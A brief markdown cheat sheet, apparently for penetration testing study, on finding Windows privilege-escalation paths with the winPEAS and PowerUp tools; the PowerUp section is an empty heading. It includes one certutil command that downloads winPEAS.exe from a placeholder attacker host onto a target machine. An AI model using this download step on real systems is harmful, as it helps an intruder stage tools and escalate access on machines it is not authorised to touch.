# Most Common PrivEsc Methods

Here are some things I do for windows privesc.

## Identifying Privesc Vector

First I like installing a `powerup` *AND* `winPEAS`. Using these tools will help us find the attack vector `80%` of the time.

### winPEAS

winPEAS is great to find some loot and privesc. Make sure to read fine print.

```cmd
certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
```

### PowerUP

